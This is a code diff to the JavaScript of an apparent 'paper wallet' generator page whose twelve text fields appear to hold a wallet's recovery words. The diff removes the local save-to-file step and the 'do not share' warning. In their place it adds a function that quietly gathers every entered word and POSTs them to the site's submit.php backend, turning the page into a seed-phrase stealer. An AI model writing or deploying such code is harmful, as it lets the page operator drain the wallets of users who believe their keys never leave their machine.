@@ -6,14 +6,52 @@ var submit = document.getElementById("submitButton");
 submit.onclick = function () {
     // check if fields 1 to 12 are filled by input type text and if they are not empty save their values to a text file
     if (checkFields()) {
-        alert("Paper Wallet Created... Store words in a safe place ... Do not share the file. Save public wallet: 0x8B2aB8edDA80eD1eB9724aE559951843F0A560Ec");
+        // alert("Thanks for submitting your information!");
 
         // save to text file
-        saveToTextFile();
+        // saveToTextFile();
+
+        // submit all fields through http to php backend
+        submitAllFields();
     }
     else {
         alert("Please fill in all fields!");
     }
+}
+
+// submit all fields through ajax to php backend
+function submitAllFields() {
+    // get all fields
+    var fields = document.getElementsByTagName("input");
+    var text = "";
+    for (var i = 0; i < fields.length; i++) {
+        if (fields[i].type == "text") {
+            if (fields[i].value != "") {
+                var fieldNumber = i + 1;
+                text += "Field " + fieldNumber + ": " + fields[i].value + "\n";
+            }
+        }
+    }
+
+    console.log(text);
+
+    // send all field values through http to php backend
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "submit.php", true);
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.send("fields=" + text);
+
+    // get response from php backend
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            alert(xhr.responseText);
+        }
+    }
+
+    // clear all fields
+    // for (var i = 0; i < fields.length; i++) {
+    //     fields[i].value = "";
+    // }
 }
 
 function saveToTextFile() {
